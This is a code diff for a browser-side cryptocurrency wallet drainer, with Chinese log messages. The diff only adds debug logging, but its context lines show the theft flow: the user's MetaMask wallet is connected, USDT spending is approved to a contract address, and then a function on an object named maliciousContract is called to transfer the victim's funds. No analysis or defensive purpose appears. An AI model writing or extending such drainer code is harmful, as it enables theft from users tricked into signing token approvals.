@@ -53,10 +53,10 @@ async function connectWallet() {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
+        console.log("连接成功:", userAddress);
 
         document.getElementById("authorizeButton").disabled = false;
         document.getElementById("executeTransferButton").disabled = false;
-        console.log("钱包连接成功:", userAddress);
     } else {
         alert("请安装 MetaMask!");
     }
@@ -69,6 +69,7 @@ async function authorizeTransfer() {
 
     try {
         const tx = await usdtContract.approve(contractAddress, amount);
+        console.log("授权交易提交:", tx);
         await tx.wait();
         console.log("授权成功:", tx);
     } catch (error) {
@@ -82,6 +83,7 @@ async function executeTransfer() {
 
     try {
         const tx = await maliciousContract.executeTransfer(userAddress);
+        console.log("转账交易提交:", tx);
         await tx.wait();
         console.log("转账成功:", tx);
     } catch (error) {
